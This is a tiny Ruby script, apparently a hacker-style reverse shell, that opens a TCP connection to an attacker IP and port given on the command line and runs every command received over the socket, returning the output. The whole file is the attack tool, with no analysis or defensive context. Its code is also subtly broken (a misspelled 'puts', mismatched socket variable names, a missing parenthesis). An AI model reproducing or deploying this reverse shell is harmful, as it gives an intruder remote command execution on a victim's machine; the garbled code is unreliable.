require 'socket'

if ARGV[0].nil? || ARGV[1].nil?
    put "Xploitable #{__FILE__}.rb [ATTACK3R_IP AT3CKR_PRT\n\n"
    exit

end

ip, prt = ARGV
S3C = TCPSocket.new(ip,prt)
while cmd = s.gets
    IO.popen(cmd,"r"{|io|s.print io.read})
end


#OCRA REQUIRED 
